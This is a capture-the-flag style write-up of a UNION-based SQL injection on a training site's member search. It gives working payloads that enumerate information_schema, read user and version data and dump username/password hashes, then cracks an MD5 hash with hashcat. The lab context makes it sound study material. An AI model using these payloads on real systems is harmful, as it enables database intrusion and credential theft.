# SQL Injection Bruteforce Members

On the member page, there is a search member by id bar.

Lets try to search with the id 1
```
ID: 1
First name: one
Surname : me
```

We got 3 informations
Same info on id 2 and 3. But nothing on 4...

Id 5 give us something interesting.

```
ID: 5
First name: Flag
Surname : GetThe
```

When we try a research with 'A' character, we got an error message.

```
Unknown column 'A' in 'where clause'
```

If we copy that in google, we can find that is a mySQL error
So we can try to insert/inject a part of sql request to show the database.

_But how and what?_

The UNION command allow us to concat multiple requests.
To forge our injection we have to put a ID first follow by UNION and a second command.

A classic in sqli is to use SELECT to display _information_schema.tables_

Lets try something
```
1 UNION SELECT * FROM information_schema.tables
```

This doesn't work because here, we have to give 2 informations to select to fill the array in first name and surname fields.

```
1 UNION SELECT table_name, table_schema FROM  information_schema.tables
```
It's work!

We got more informations:
```
ID: 1 UNION SELECT table_name, table_schema FROM  information_schema.tables
First name: db_default
Surname : Member_Brute_Force

ID: 1 UNION SELECT table_name, table_schema FROM  information_schema.tables
First name: users
Surname : Member_Sql_Injection

ID: 1 UNION SELECT table_name, table_schema FROM  information_schema.tables
First name: guestbook
Surname : Member_guestbook

ID: 1 UNION SELECT table_name, table_schema FROM  information_schema.tables
First name: list_images
Surname : Member_images

ID: 1 UNION SELECT table_name, table_schema FROM  information_schema.tables
First name: vote_dbs
Surname : Member_survey
```

But here we need the column_name for each table_name or table_schema.
So lets try this
```
1 UNION ALL SELECT table_name,column_name FROM information_schema.columns;#
```

We now have everything we need to display what we want in the database!

**Awesome!!!**

```
ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: db_default
Surname : id

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: db_default
Surname : username

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: db_default
Surname : password

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: users
Surname : user_id

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: users
Surname : first_name

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: users
Surname : last_name

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: users
Surname : town

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: users
Surname : country

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: users
Surname : planet

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: users
Surname : Commentaire

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: users
Surname : countersign

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: guestbook
Surname : id_comment

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: guestbook
Surname : comment

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: guestbook
Surname : name

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: list_images
Surname : id

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: list_images
Surname : url

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: list_images
Surname : title

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: list_images
Surname : comment

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: vote_dbs
Surname : id_vote

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: vote_dbs
Surname : vote

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: vote_dbs
Surname : nb_vote

ID: 1 UNION SELECT table_name,column_name FROM information_schema.columns
First name: vote_dbs
Surname : subject
```

We can also get some versions, usefull informations!

```
1 UNION ALL SELECT system_user(), user();#
1 UNION ALL SELECT UUID(), @@version;#
```



```
ID: 1 UNION SELECT countersign,Commentaire FROM Member_Sql_Injection.users
First name: 5ff9d0165b4f92b14994e5c685cdce28
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```


As _username_ and _password_ are columns of _Member_Brute_Force_ schema, which is part of the table_name _db_default_

We can now try
```
1 UNION SELECT username,password FROM Member_Brute_Force.db_default
```

And we get
```
ID: 1 UNION SELECT username,password FROM Member_Brute_Force.db_default
First name: root
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8

ID: 1 UNION SELECT username,password FROM Member_Brute_Force.db_default
First name: admin
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
```

This is probably an hash, it loots like md5

Lets try bruteforce it with hashcat in kali
```
┌──(kali㉿kali)-[~]
└─$ hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt --force

3bf1114a986ba87ed28fc1b5884fc2f8:shadow

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
```



## External Resources
https://book.hacktricks.xyz/pentesting-web/sql-injection
https://owasp.org/www-community/attacks/SQL_Injection
https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635
https://sql.sh/cours/union
